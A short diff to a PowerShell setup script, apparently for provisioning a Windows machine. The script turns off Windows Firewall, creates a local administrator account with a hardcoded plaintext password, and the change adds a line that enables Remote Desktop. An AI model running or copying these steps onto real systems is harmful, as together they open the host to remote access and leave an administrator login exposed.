@@ -1,6 +1,9 @@
 #Set Windows Firewall to OFF
 set-NetFirewallProfile -All -Enabled False
- 
+
+#enable remote desktop
+Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -name "fDenyTSConnections" -value 0
+
 #Create User and Add to Local Administrator Group
 $password = ConvertTo-SecureString 'fiVvH_7HCCYZvXed' -AsPlainText -Force
 new-localuser -Name telepo -Password $password
